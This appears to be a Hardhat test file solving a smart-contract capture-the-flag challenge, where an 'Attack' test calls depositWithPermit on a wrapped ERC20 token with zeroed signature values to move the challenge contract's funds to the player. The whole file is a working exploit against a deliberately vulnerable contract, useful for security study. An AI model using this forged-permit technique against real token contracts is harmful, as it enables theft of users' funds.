import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { WrappedERC20, WrappedERC20Challenge } from '../typechain-types'
import { toWei } from './helpers/utils'
import { formatBytes32String } from 'ethers/lib/utils'

describe('WrappedERC20Challenge', async function () {
  let player: SignerWithAddress
  let challenge: WrappedERC20Challenge

  before(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('WrappedERC20Challenge')
    challenge = (await Challenge.deploy({
      value: toWei('10'),
    })) as WrappedERC20Challenge
  })

  it('Attack', async function () {
    const wwEth = (await ethers.getContractAt(
      'WrappedERC20',
      await challenge.wwETH()
    )) as WrappedERC20

    await wwEth.depositWithPermit(
      challenge.address,
      toWei('5'),
      0,
      0,
      formatBytes32String("0x00"),
      formatBytes32String("0x00"),
      player.address
    )
    expect(await challenge.isSolved()).to.be.true
  })
})
